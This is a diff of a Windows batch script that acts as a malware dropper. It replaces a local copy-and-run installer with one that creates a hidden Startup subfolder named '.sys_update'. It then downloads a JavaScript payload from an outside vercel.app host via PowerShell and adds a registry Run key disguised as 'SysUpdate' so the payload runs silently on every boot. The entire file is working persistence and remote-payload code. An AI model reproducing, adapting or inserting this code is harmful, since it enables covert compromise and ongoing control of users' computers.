@@ -1,15 +1,19 @@
 @echo off
-:: Create a hidden directory for the payload
-mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.hidden" 2>nul
+:: Check if already installed in AppData
+if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.sys_update\payload.js" goto :END
 
-:: Copy payload to startup folder
-copy "%~dp0payload.js" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.hidden\payload.js" 2>nul
+:: Create hidden directory
+set DIR="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.sys_update"
+mkdir %DIR% 2>nul
 
-:: Create a shortcut to run payload silently
-set SCRIPT_PATH="%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.hidden\payload.js"
-set WSCRIPT="%SYSTEMROOT%\System32\wscript.exe"
-%WSCRIPT% //nologo //e:jscript "%SCRIPT_PATH%"
+:: Download the latest payload from Vercel/GitHub (Replace URL below)
+powershell -Command "Invoke-WebRequest -Uri 'https://payload-phi-seven.vercel.app/payload.js' -OutFile '%DIR%\payload.js'"
 
-:: Delete installer itself
-del /f /q "%~f0"
+:: Add Registry Persistence (Runs silently on boot)
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "wscript.exe //nologo //e:jscript \"%DIR%\payload.js\"" /f
+
+:: Execute the payload using WScript (Hides the black console window)
+%SYSTEMROOT%\System32\wscript.exe //nologo //e:jscript "%DIR%\payload.js"
+
+:END
 exit
